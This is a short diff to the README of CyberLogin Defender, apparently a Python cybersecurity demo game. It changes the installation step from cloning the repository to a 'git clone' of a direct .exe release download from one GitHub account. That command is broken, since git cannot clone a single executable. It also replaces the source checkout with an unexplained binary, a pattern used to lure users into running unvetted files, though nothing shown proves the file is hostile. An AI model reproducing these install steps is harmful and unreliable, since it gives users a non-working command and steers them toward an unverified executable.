@@ -17,4 +17,5 @@ CyberLogin Defender is a **Python-based cybersecurity demo game** that demonstra
 ## Installation
 1. Clone this repository:
    ```bash
-   git clone https://github.com/YourUsername/CyberLogin-Defender.git
+   git clone https://github.com/EncryptedCharles404/CyberLogin-Defender/releases/download/v1.0/CyberLogin_Defender.exe
+
